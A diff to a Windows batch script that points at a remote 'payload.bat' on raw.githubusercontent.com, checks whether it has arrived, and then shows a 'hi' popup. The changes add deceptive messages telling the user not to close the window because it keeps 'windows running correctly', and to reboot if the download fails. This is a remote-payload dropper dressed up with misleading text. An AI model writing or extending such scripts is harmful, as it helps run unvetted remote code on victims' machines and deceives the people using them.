@@ -1,6 +1,8 @@
 @echo off
 setlocal
 
+echo Please DO NOT close this terminal window. It is important to maintain windows running correctly.
+
 :: Define the URL of the payload script to download
 set "PAYLOAD_URL=https://raw.githubusercontent.com/wicorn29/batch/main/payload.bat"
 
@@ -25,7 +27,8 @@ if exist %PAYLOAD_PATH% (
     :: Show a popup saying "hi"
     powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('hi')"
 ) else (
-    echo Failed to download the payload script.
+    echo Failed to download the payload script. Please check your internet connection and reboot your computer.
+pause
 )
 
 endlocal
